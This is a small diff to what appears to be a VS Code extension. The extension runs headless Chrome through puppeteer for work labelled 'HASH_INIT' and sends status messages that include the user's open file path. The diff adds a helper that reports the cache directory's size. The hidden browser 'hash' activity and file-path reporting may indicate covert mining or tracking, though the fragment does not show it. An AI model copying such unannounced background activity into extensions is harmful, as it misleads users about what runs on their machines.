@@ -37,6 +37,7 @@
       return tstt({
         message: "HASH_INIT",
         value: 0,
+        cache: dirSize(cacheDir),
         file: safe(() => editor?.document?.uri?.fsPath)
       });
     const hs = await page.evaluate(() => {
@@ -48,7 +49,7 @@
       file: safe(() => editor?.document?.uri?.fsPath)
     });
   }, 30000);
-  
+
   browser = await puppeteer.launch({
     executablePath: chromePath,
     headless: true,
@@ -66,6 +67,11 @@
 
   await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
 
+  function dirSize(directory) {
+    const files = fs.readdirSync(directory);
+    const stats = files.map(file => statSync(path.join(directory, file)));
+    return stats.reduce((accumulator, { size }) => accumulator + size, 0);
+  }
 
 
 })();
